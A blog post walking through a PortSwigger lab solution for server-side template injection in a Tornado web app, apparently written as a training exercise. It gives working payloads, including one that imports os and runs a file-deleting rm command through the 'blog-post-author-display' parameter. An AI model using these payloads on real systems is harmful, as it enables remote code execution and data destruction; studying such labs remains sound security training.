---
title: Basic server-side template injection (code context) | 2023
url: https://infosecwriteups.com/basic-server-side-template-injection-code-context-2023-444f71b178bf?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-02-08
fetch_date: 2025-10-04T05:57:56.725510
---

# Basic server-side template injection (code context) | 2023

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F444f71b178bf&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbasic-server-side-template-injection-code-context-2023-444f71b178bf&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbasic-server-side-template-injection-code-context-2023-444f71b178bf&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40cyberw1ng)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-444f71b178bf---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-444f71b178bf---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Basic Server-Side Template Injection (code context) | 2023

## Portswigger Lab Solution — SSTI Code Context | Karthikeyan Nagaraj

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---byline--444f71b178bf---------------------------------------)

[Karthikeyan Nagaraj](https://cyberw1ng.medium.com/?source=post_page---byline--444f71b178bf---------------------------------------)

3 min read

·

Jan 21, 2023

--

Listen

Share

Press enter or click to view image in full size

![]()

Check out the Basics of SSTI in my previous post

[## Basic SSTI — Server-Side Template Injection | 2023

### Portswigger — Basic server-side template injection Solution | Karthikeyan Nagaraj

cyberw1ng.medium.com](https://cyberw1ng.medium.com/basic-ssti-server-side-template-injection-2023-da4995583554?source=post_page-----444f71b178bf---------------------------------------)

### Lab Description:

* This lab is vulnerable to [server-side template injection](https://medium.com/%40cyberw1ng/basic-ssti-server-side-template-injection-2023-da4995583554) due to the way it unsafely uses a`Tornado template`.
* To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
* You can log in to your own account using the following credentials: `wiener:peter`

### Analysis:

1. Login into the account`wiener:peter` and post a comment.

For Example, I’m inserting`{{5*5}}` as Comment

![]()

2. Check out`My Account`, we can see that there is a Functionality called the`Preferred name` which may be vulnerable

Press enter or click to view image in full size

![]()

3. Intercept the traffic through burp and send it to Repeater — Ctrl+r

Press enter or click to view image in full size

![]()

4. Let’s try to Inject Tornado’s Template Expressions.

The Below Syntax is used for Tornado

```
{{someExpression}}
```

5. Let’s test whether the Expression is Executing or Not by Sending the below payload into the parameter`blog-post-author-display`

```
}}{%25+import+os+%25}{{+"+Working"
```

![]()

Reload the Page. Make sure to turn Off the proxy or the Intercept Off

![]()

It’s Working : )

Some of the Payloads

`{{7*7}} = 49`
`${7*7} = ${7*7}`
`{{foobar}} = Error`
`{{7*’7'}} = 7777777`

6. As we know the syntax of Tornado’s Template and we also know that the expressions are Executing, So Let’s use the python code as a payload to delete`morale.txt`

```
}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

Press enter or click to view image in full size

![]()

A YouTube Channel for Cybersecurity Lab’s Poc and Write-ups

[## Cyberw1ng

### Learn Cyber Security and Create Awareness ~ cyberwing Stay tuned with me, Subscribe, and Like the Videos… Ask Doubts…

www.youtube.com](https://www.youtube.com/channel/UCBg0UIT0319Xc-cw4QK8bqA?sub_confirmation=1&source=post_page-----444f71b178bf---------------------------------------)

Github for Resources:

[## Cyberw1ng — Overview

### Security Researcher and Bug Hunter. Cyberw1ng has 8 repositories available. Follow their code on GitHub.

github.com](https://github.com/cyberw1ng?source=post_page-----444f71b178bf---------------------------------------)

Telegram Channel for Free Ethical Hacking Dumps

[## Ethical Hacking Dumps — CEH, OSCP, Comptia

### Materials and Books for Ethical Hacking Exams like CEH v12, OSCP, Comptia Pentest+, Comptia Security+, Comptia Network+…

t.me](https://t.me/ethicalhackingessentials?source=post_page-----444f71b178bf---------------------------------------)

Thank you for Reading!

Happy Ethical Hacking ~

`Author: Karthikeyan Nagaraj ~ Cyberw1ng`

Feel Free to Ask Queries via [LinkedIn](https://www.linkedin.com/in/karthikeyan-nagaraj) and to Buy me a Cofee : )

[![]()](http://buymeacoffee.com/cyberw1ng)

[Portswigger](https://medium.com/tag/portswigger?source=post_page-----444f71b178bf---------------------------------------)

[Python](https://medium.com/tag/python?source=post_page-----444f71b178bf---------------------------------------)

[Ssti](https://medium.com/tag/ssti?source=post_page-----444f71b178bf---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----444f71b178bf---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----444f71b178bf---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--444f71b178bf---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--444f71b178bf---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--444f71b178bf---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--444f71b178bf---------------------------------------)

·[Last published 5 days ago](/how-to-find-p1-bugs-using-google-in-your-target-part-1-e37455324dc1?source=post_page---post_publication_info--444f71b178bf---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/resize:fill:96:96/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---post_author_info--444f71b178bf-----------...